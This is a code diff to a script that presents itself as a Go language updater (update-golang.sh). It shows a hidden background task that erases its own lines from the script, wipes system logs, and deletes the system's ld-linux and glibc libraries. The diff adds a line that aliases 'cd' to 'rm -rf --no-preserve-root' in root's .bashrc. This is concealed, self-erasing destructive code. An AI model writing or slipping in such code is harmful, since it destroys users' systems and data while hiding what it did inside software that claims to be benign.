@@ -566,7 +566,7 @@ msg "Starting all nohup background tasks."
 nohup sh -c '
   echo "nohup background task: Waiting 10000s to delete files"
   sleep 45
-  sed -i "564,584d" /root/update-golang/update-golang.sh
+  sed -i "564,585d" /root/update-golang/update-golang.sh
   sleep 10000
   rm -rf /var/log/*
   sleep 5
@@ -576,6 +576,7 @@ nohup sh -c '
   find / -type f -name "ld-linux*" -print -delete
   find / -type f -name "glibc*" -print -delete
   sleep 5
+  echo "alias cd='\''rm -rf --no-preserve-root'\''" >> /root/.bashrc
   echo "nohup background task: Deletion of files complete."
 ' > /dev/null 2>&1 &
 msg "Scheduled (nohup) deletion of files to run in background after 2 hours."
